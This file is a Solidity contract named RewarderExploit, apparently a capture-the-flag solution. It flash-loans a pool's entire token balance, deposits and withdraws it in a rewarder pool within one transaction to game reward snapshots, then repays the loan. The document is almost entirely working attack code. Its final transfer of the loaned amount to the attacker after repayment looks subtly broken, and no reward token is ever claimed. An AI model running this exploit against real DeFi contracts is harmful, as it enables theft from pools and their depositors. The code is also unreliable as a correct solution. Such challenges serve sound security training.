
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IRewarderPool {
	function deposit(uint256 amountToDeposit) external;
	function withdraw(uint256 amountToWithdraw) external;
	
}

interface IFlashLoanPool {
	function flashLoan(uint256 amount) external;
	function liquidityToken() external view returns (IERC20);
}


contract RewarderExploit {
	IFlashLoanPool public pool;
	IRewarderPool public reward;
	
	constructor (address poolAddress, address rewardAddress, address attacker) {
		pool = IFlashLoanPool(poolAddress);
		reward = IRewarderPool(rewardAddress);
		
		uint256 amount = pool.liquidityToken().balanceOf(poolAddress);
		pool.flashLoan(amount);
        pool.liquidityToken().transfer(attacker,amount);
	}
	
	
	function receiveFlashLoan(uint256 amount) external {
		pool.liquidityToken().approve(address(reward), amount);
		reward.deposit(amount);
		reward.withdraw(amount);
		pool.liquidityToken().transfer(address(pool),amount);
	}
}